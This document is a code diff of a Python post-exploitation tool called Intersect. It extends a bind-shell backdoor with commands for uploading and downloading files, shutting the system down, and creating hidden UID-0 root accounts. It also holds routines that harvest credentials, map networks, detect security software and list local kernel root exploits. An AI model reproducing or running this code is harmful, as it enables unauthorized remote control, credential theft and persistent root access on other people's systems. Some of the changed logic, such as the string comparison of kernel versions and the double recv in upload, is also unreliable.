@@ -86,18 +86,23 @@ def environment():
    global UTMP_FILEPATH      
    global WTMP_FILEPATH       
    global LASTLOG_FILEPATH   
-      
+   
+   fullkernel = os.uname()[2]
+   splitkern = fullkernel.split("-")
+   kernel = splitkern[0]
+   distro = os.uname()[1]
+   arch = os.uname()[4]
+ 
    if os.geteuid() != 0:
-        print("[!] This script *must* be executed as root. If not, there will be errors and/or crashes.")
-        print("[!] Intersect 2.0 is shutting down....Please run again as root")
-        # if user is not root, ask if they want to run exploitCheck() feature to find local root suggestions
+        print("[*] This script *must* be executed as root. If not, there will be errors and/or crashes.")
+        print("[*] Intersect will now check this kernel for possible privilege escalation exploits.\n     We will find your kernel version and display a list of exploits for that kernel, if available.")
+        exploitCheck()
+        print("[+] The exploits above *might* allow you to gain root access.")
+        print("[+] Intersect cannot be executed as a non-root user. Please run again while root.")
         sys.exit()
    else:
         pass
 
-   kernel = os.uname()[2]
-   distro = os.uname()[1]
-   arch = os.uname()[4]
    Home_Dir = os.environ['HOME']
    User_Ip_Address = socket.gethostbyname(socket.gethostname())
     
@@ -124,7 +129,7 @@ def environment():
    print "[!] Reports will be saved in: %s" % Temp_Dir
   
 def Gather_OS():
-   print("[+] Collecting operating system and user information....\n")
+   print("[+] Collecting operating system and user information....")
    os.mkdir(Temp_Dir+"/osinfo/")
    os.mkdir(Temp_Dir+"/configs/")
    os.chdir(Temp_Dir+"/osinfo/")
@@ -185,7 +190,7 @@ def Gather_OS():
    
 def GetCredentials():
     # Feature is being rewritten to speed up process and avoid non-root permission issues
-    print("[+] Collecting user and system credentials....\n")
+    print("[+] Collecting user and system credentials....")
     os.mkdir(Temp_Dir+"/credentials")
     os.chdir(Temp_Dir+"/credentials/")
     os.system('getent passwd > passwd.txt')
@@ -221,7 +226,7 @@ def GetCredentials():
 
 def NetworkInfo():
     # Fix getGateway
-   print("[+] Collecting network info: services, ports, active connections, dns, gateways, etc...\n")
+   print("[+] Collecting network info: services, ports, active connections, dns, gateways, etc...")
    os.mkdir(Temp_Dir+"/network")
    networkdir = (Temp_Dir+"/network")
    os.chdir(networkdir) 
@@ -267,7 +272,7 @@ def NetworkMap():
    # Add service identification via socket for all open ports
    # Add traceroute after finding live hosts. Send all results to graph report.
    
-    print("[+] Searching for live hosts...\n")
+    print("[+] Searching for live hosts...")
     os.mkdir(Temp_Dir+"/hosts")
     os.chdir(Temp_Dir+"/hosts")
     conf.verb=0
@@ -335,7 +340,7 @@ def FindProtect():
     # This is just a temporary way of doing it while I finish rewriting this feature and
     # add the rest of the applications that we try to find. 
     
-    print("[+] Finding system protection applications....\n")
+    print("[+] Finding system protection applications....")
     os.mkdir(Temp_Dir+"/protection")
     protectiondir = (Temp_Dir+"/protection")
     os.chdir(protectiondir)
@@ -442,22 +447,9 @@ def exploitCheck():
 
     exploitdb_url = "http://www.exploit-db.com/exploits"
     enlightenment_url = "http://www.grsecurity.net/~spender/enlightenment.tgz"
-    version = "1.4"
-    scriptname = os.path.basename(sys.argv[0])
     
-    split_version = version.split(".")
+    print "[+] Results for local kernel version %s" % kernel
 
-    if len(split_version) >= 3 and len(split_version[2]) == 1:
-        split_version[2] = "0%s" % split_version[2]
-        version = ".".join(v for v in split_version)
-
-    return version
-    
-    kernel_version_string = os.popen('uname -r').read().strip()
-    print "[+] Results for local kernel version %s" % kernel_version_string
-
-    kernel_parts = kernel_version_string.split("-")
-    kernel_version = fix_version(kernel_parts[0])
     found_exploit = False
     exploits = {
                  "do_brk": { "CVE": "2003-0961", "versions": ("2.4.0-2.4.22",), "exploits": (131,) },
@@ -507,19 +499,13 @@ def exploitCheck():
             else:
                 min_version, max_version = version_tree, version_tree
 
-            if kernel_version >= fix_version(min_version) and kernel_version <= fix_version(max_version):
+            if kernel >= min_version and kernel <= max_version:
                 cve = data["CVE"]
                 exploits = data["exploits"]
                 found_exploit = True
 
                 print "\n* Linux Kernel %s Local Root Exploit\n    CVE: CVE-%s\n    Affected Kernels: %s-%s\n    Exploits:\n%s" % (name, cve, min_version, max_version, "\n".join("      %s/%d" % (exploitdb_url, expl) if isinstance(expl, int) else "      %s" % expl for expl in exploits))
 
-    if found_exploit:
-        print
-
-        if len(kernel_parts) > 1:
-            print "WARNING: %s appears to be a modified version of kernel %s." % (kernel_version_string, kernel_version)
-            print "These exploits *might* allow you to obtain root access by privilege escalation, but this feature does not take in account kernels that are modified or otherwise patched\n"
 
 
 def bindShell():
@@ -544,13 +530,53 @@ def bindShell():
              )
         stdout, stderr = proc.communicate()
         if cmd.startswith('cd'):
-            os.chdir(cmd[3:].replace('\n',''))
-            conn.send("\nIntersect"+str(os.getcwd())+" $ ")
+             os.chdir(cmd[3:].replace('\n',''))
+             conn.send("\nIntersect"+str(os.getcwd())+" $ ")
         elif cmd.startswith('adduser'):
             strip = cmd.split(" ")
             acct = strip[1]
             os.system("/usr/sbin/useradd -M -o -s /bin/bash -u 0 -l " + acct)
             conn.send("[!] Root account " + acct + " has been created.")   
+        elif cmd.startswith('upload'):
+            data = conn.recv(1024)
+            strip = cmd.split(" ")
+            filename = strip[1]
+            data = conn.recv(1024)
+            filewrite=file(filename, "wb")
+            filewrite.write(data)
+            filewrite.close()
+            if os.path.isfile(filename):
+                conn.send("[!] File upload complete!")
+            if not os.path.isfile(filename):
+                conn.send("[!] File upload failed! Please try again")
+        elif cmd.startswith('download'):
+            data = conn.recv(1024)
+            strip = cmd.split(" ")
+            filename = strip[1]
+            if not os.path.isfile(filename):
+                 conn.send("[!] File not found on host! Check the filename and try again.")
+            if os.path.isfile(filename):
+                 fileopen=file(filename, "rb")
+                 file_data=""
+                 for data in fileopen:
+                       file_data += data
+                       conn.sendall(file_data)
+        elif cmd.startswith("rebootsys"):
+             conn.send("[!] Server system is going down for a reboot!")
+             os.system("shutdown -h now")
+        elif cmd.startswith('helpme'):
+            conn.send(" Intersect TCP Shell | Help Menu \n")
+            conn.send("---------------------------------\n")
+            conn.send("** download <file> | download file from host\n")
+            conn.send("** upload <file>   | upload file to host\n")
+            conn.send("** extask <task>   | run Intersect task\n")
+            conn.send("** isniff <iface>  | start sniffer on <iface>\n")
+            conn.send("** usessh <port>   | enable SSH on <port>\n")
+            conn.send("   adduser <name>  | add new root account\n")
+            conn.send("   rebootsys       | reboots server system\n")
+            conn.send("   helpme          | show this help menu\n")
+            conn.send("** = must connect using the Intersect shell client to use this feature.")
+            conn.send("\nIntersect"+str(os.getcwd())+" $ ")
         elif proc:
             conn.sendall( stdout )
             conn.send("\nIntersect"+str(os.getcwd())+" $ ")
